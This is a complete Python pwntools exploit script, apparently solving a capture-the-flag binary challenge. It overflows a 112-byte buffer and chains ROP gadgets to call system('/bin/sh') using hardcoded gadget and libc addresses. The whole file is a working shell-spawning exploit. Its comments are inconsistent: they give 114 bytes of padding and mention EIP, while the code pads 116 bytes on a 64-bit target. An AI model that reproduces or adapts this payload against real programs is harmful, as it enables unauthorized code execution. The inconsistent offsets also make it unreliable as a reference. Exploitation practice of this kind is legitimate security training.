from pwn import *
import struct
import re
import sys

########################################################################
# https://ctf101.org/binary-exploitation/return-oriented-programming/  #
########################################################################

## PLAN ##
#   GARBAGE UP TO STORED EIP (114) [112 Buffer + Base Pointer]
#   G1 [pop rdi; ret]
#       Gadget Address 
#       Argument (libc "/bin/sh")
#   G2 [pop rsi; pop r15; ret]
#       Gadget Address 
#       Argument rsi (exit address)
#       Argument r15 (Garbage)
#       System address

# =========================== VARIABLES ======================================
# Length of the vuln buffer
BUFFER_LEN = 112
# ===========================================================================

# pop rdi; ret
g1 = p64(0x40120b)

# pop rsi; pop r15; ret
g2 = p64(0x401209)

# libc
libc = 0x7f5008429000
bin_sh = p64(libc + 0x186cee)

# system final return
system  = p64(0x401040)

payload =  b"A" * (BUFFER_LEN + 4)
payload += g1
payload += bin_sh
payload += g2
payload += p64(0xaa)
payload += p64(0xaa)
payload += system

sys.stdout.buffer.write(payload)